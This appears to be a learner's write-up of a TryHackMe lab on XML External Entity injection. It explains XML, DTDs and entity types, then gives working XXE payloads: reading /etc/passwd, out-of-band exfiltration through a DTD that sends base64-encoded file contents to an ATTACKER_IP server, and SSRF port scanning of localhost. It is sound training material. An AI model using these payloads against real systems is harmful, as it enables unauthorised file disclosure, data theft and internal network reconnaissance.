# XXE Injection

**Room Link:** [https://tryhackme.com/r/room/xxeinjection](https://tryhackme.com/r/room/xxeinjection)

## Exploring XML

#### What is XML?

XML (Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on. XML is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable. It's a flexible and widely used format for exchanging data between different systems and applications. XML consists of elements, attributes, and character data, which are used to represent data in a structured and organized way.

#### XML Syntax and Structure

XML elements are represented by tags, which are surrounded by angle brackets (<>). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

The tag `<name>John</name>` represents an element named "name" with the content "John". Attributes provide additional information about elements and are specified within the opening tag. The tag `<user id="1">` specifies an attribute "id" with the value "1" for the element "user". Character data refers to the content within elements, such as "John".

The example above shows a simple XML document with elements, attributes, and character data. The tag `<?xml version="1.0" encoding="UTF-8"?>` declaration indicates the XML version, and the element contains various sub-elements and attributes representing user data.

#### Common Use Cases in Web Applications

XML is widely used in web applications for data exchange, storage, and configuration. It's often used for web services and APIs, such as SOAP and REST, to exchange data between systems. XML is also used for configuration files, such as web server configurations or application settings.

#### What is XSLT?

XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents. While XSLT is primarily used for data transformation and formatting, it is also significantly relevant to XXE (XML External Entities) attacks.

XSLT can be used to facilitate XXE attacks in several ways:\


1. Data Extraction: XSLT can be used to extract sensitive data from an XML document, which can then be used in an XXE attack. For example, an XSLT stylesheet can extract user credentials or other sensitive information from an XML file.
2. Entity Expansion: XSLT can expand entities defined in an XML document, including external entities. This can allow an attacker to inject malicious entities, leading to an XXE vulnerability.
3. Data Manipulation: XSLT can manipulate data in an XML document, potentially allowing an attacker to inject malicious data or modify existing data to exploit an XXE vulnerability.
4. Blind XXE: XSLT can be used to perform blind XXE attacks, in which an attacker injects malicious entities without seeing the server's response.\


#### What are DTDs?

DTDs or Document Type Definitions define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file.

Purpose and usage of DTDs:

* Validation: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
* Entity Declaration: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.\


Internal DTDs are specified using the `<!DOCTYPE` declaration, while external DTDs are referenced using the SYSTEM keyword.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

The example above shows an internal DTD defining the structure of a configuration file. The \<!ELEMENT declarations specify the allowed elements and their relationships.

#### DTDs and XXE

DTDs play a crucial role in XXE injection, as they can be used to declare external entities. External entities can reference external files or URLs, which can lead to malicious data or code injection.

#### XML Entities

XML entities are placeholders for data or code that can be expanded within an XML document. There are five types of entities: internal entities, external entities, parameter entities, general entities, and character entities.

Example external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

This shows an external entity referencing a URL. The `&external;` reference within the XML document will be expanded to the contents of the referenced URL.

#### Types of Entities

1.  Internal Entities are essentially variables used within an XML document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY inf "This is a test.">
    ]>
    <note>
            <info>&inf;</info>
    </note>
    ```

    In this example, the `&inf;` entity is replaced by its value wherever it appears in the document.
2.  External Entities are similar to internal entities, but their contents are referenced from outside the XML document, such as from a separate file or URL. This feature can be exploited in XXE (XML External Entity) attacks if the XML processor is configured to resolve external entities. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```

    Here, `&ext;` pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.
3.  Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scale XML applications. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```

    In this case, `%common;` is used within the DTD to define the type of data that the `name` element should contain.
4.  General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of the XML document. Unlike parameter entities, general entities are intended for use in the document content. For example:

    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```

    The entity `&author;` is a general entity used to substitute the author's name wherever it's referenced in the document.
5.  Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from misinterpreting XML syntax. For example:

    * `&lt;` for the less-than symbol (`<`)
    * `&gt;` for the greater-than symbol (`>`)
    * `&amp;` for the ampersand (`&`)

    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```

    This usage ensures that the special characters are processed correctly by the XML parser without breaking the document's structure.

The image below shows the type of entities in a DOM structure:

![Types of entities in DOM structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716545852309)\


_source: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/reading-entity-declarations-and-entity-references-into-the-dom_

## XML Parsing Mechanisms

* **DOM (Document Object Model) Parser**: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
* **SAX (Simple API for XML) Parser**: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
* **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.
* XPath Parser: Parses an XML document based on expression and is used extensively in conjunction with XSLT.

## Exploiting XXE - In-Band

#### In-Band vs Out-of-Band XXE

In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.

Out-of-band XXE, on the other hand, refers to an XXE vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request.

#### In-Band XXE Exploitation

We will be using [Burp](https://tryhackme.com/module/learn-burp-suite) for this room. To demonstrate this vulnerability, go to [http://10.10.12.246/contact.php](http://10.10.12.246/contact.php), and fill out the form.

![Homepage of the application](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/db8f3f703dd6b8641d5555ed6ead1b49.png)\


Click the submit button and intercept the request.

![Intercepted request of the contact form](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/734c868f5e54ae3b3d0c3539301f2256.png)\


The submitted data is processed by contact\_submit.php, which contains a vulnerable PHP code designed to return the value of the name parameter when a user submits a message in the form. Below is the vulnerable code:

```php
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

Since the application returns the value of the name parameter, we can inject an entity that is pointing to `/etc/passwd` to disclose its values.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Using the payload above, replace the initial XML data submitted to contact\_submit.php and resend the request.

![Injected xxe payload pointed to /etc/passwd file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2f5c2d1f8e4c04b03daa1240463e7580.png)\


#### XML Entity Expansion

XML Entity Expansion is a technique often used in XXE attacks that involves defining entities within an XML document, which the XML parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-band XXE, as it allows attackers to inject malicious entities into the XML data. For example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

In the payload above, `&xxe;` is expanded wherever it appears. Attackers can use entity expansion to perform a Billion Laughs attack, where a small XML document recursively expands to consume server resources, leading to a denial of service.

![XML Expansion in action](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3e45b26afe9371b2061afbdba33ea3ce.png)\




Contents of /opt/14232d6db2b5fd937aa92e8b3c48d958.txt

&#x20;_**Burp**_

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt" >]>
<contact><name>&xxe;</name><email>test2@testmail.com</email><message>test3</message></contact>
```

<figure><img src="../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>

## Exploiting XXE - Out-of-Band

#### Out-Of-Band XXE

On the other hand, to demonstrate this vulnerability, go to [http://10.10.89.251/index.php](http://10.10.89.251/index.php). The application uses the below code when a user uploads a file:

```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

The code above doesn't return the values of the submitted XML data. Hence, the term Out-of-Band since the exfiltrated data has to be captured using an attacker-controlled server.

For this attack, we will need a server that will receive data from other servers. You can use Python's http.server module, although there are options out there, like Apache or Nginx. Using AttackBox or your own machine, start a Python web server by using the command:

Starting a Python Webserver

**Kali**

```shell-session
python3 -m http.server 1337
```

Upload a file in the application and monitor the request that is sent to `submit.php` using your Burp. Forward the request below to Burp Repeater.

![Forward the request to repeater](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0ac465ae50933198b249c9e622cb8d9d.png)\


Using the payload below, replace the value of the XML file in the request and resend it. Note that you have to replace the ATTACKER\_IP variable with your own IP.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://$KALI:1337/" >]>
<upload><file>&xxe;</file></upload>
```

Send the modified HTTP request.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/08cbba233f61b8bc17e166c089931bd6.png" alt=""><figcaption></figcaption></figure>

After sending the modified HTTP request, the Python web server will receive a connection from the target machine. The establishment of a connection with the server indicates that sensitive information can be extracted from the application.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8cfa02d850cc73372dd6993acd9265fd.png" alt=""><figcaption></figcaption></figure>

We can now create a DTD file that contains an external entity with a PHP filter to exfiltrate data from the target web application.

Save the sample DTD file below and name it as `sample.dtd`. The payload below will exfiltrate the contents of `/etc/passwd` and send the response back to the attacker-controlled server:

**sample.dtd**

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

DTD Payload Explained

The DTD begins with a declaration of an entity `%cmd` that points to a system resource. The **`%cmd`** entity refers to a resource within the PHP filter protocol `php://filter/convert.base64-encode/resource=/etc/passwd`. It retrieves the content of `/etc/passwd`, a standard file in Unix-based systems containing user account information. The `convert.base64-encode` filter encodes the content in Base64 format to avoid formatting problems. The **`%oobxxe`** entity contains another XML entity declaration, `exfil`, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data with `%cmd`, representing the Base64-encoded content of `/etc/passwd`. When `%oobxxe;` is parsed, it creates the `exfil` entity that connects to an attacker's server (`http://ATTACKER_IP:1337/`). The parameter `?data=%cmd` sends the Base64-encoded content from `%cmd`.

Go back to the repeater and change your payload to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2e5178fb66945cbbb4e855d013690c9c.png" alt=""><figcaption></figcaption></figure>

Resend the request and check your terminal. You will receive two (2) requests. The first is the request for the sample.dtd file, and the second is the request sent by the vulnerable application containing the encoded /etc/passwd.

![Two external connections received in the webserver with the exfiltrated data](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9c87f37b1fed79110958f8cdfc492c93.png)

Decoding the exfiltrated base64 data will show that it contains the base64 value of /etc/passwd.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/4ea510718c602ecaa7de8357599e8ab3.png" alt=""><figcaption></figcaption></figure>

## SSRF + XXE

**Server-Side Request Forgery (SSRF)** attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location. In the context of XXE, an attacker can manipulate XML input to make the server issue requests to internal services or access internal files. This technique can be used to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the server’s local network.

#### Internal Network Scanning

Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.

For example, using the captured request from the in-band XXE task, send the captured request to Burp Intruder and use the payload below:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

The external entity is set to fetch data from `http://localhost:§10§/`. Intruder will then reiterate the request and search for an internal service running on the server.

Steps to brute force for open ports:

1\. Once the captured request from the In-Band XXE is in Intruder, click the Add `§` button while highlighting the port.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/593a4fc9649f7eb2fec803104b3a897b.png" alt=""><figcaption></figcaption></figure>

2\. In the Payloads tab, set the payload type to Numbers with the Payload settings from 1 to 65535.

![Payloads tab with the right settings](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/e5358d3d6bde1dda471a34d9e207598e.png)

3\. Once done, click the Start attack button and click the Length column to sort which item has the largest size. The difference in the server's response size is worth further investigation since it might contain information that is different compared to the other intruder requests.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6f184ed4700daf4859c6d4314a0205f5.png" alt=""><figcaption></figcaption></figure>

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/634833be32484b2bfeb5761d3de57611.png" alt=""><figcaption></figcaption></figure>

**How the Server Processes This**:

The entity `&xxe;` is referenced within the `<name>` tag, triggering the server to make an HTTP request to the specified URL when the XML is parsed. The response of the requested resource will then be included in the server response. If an application contains secret keys, API keys, or hardcoded passwords, this information can then be used in another form of attack, such as password reuse.

#### Potential Security Implications

* **Reconnaissance**: Attackers can discover services running on internal network ports and gain insights into the server's internal architecture.
* **Data Leakage**: If the internal service returns sensitive information, it could be exposed externally through errors or XML data output.
* **Elevation of Privilege**: Accessing internal services could lead to further exploits, potentially escalating an attacker's capabilities within the network.



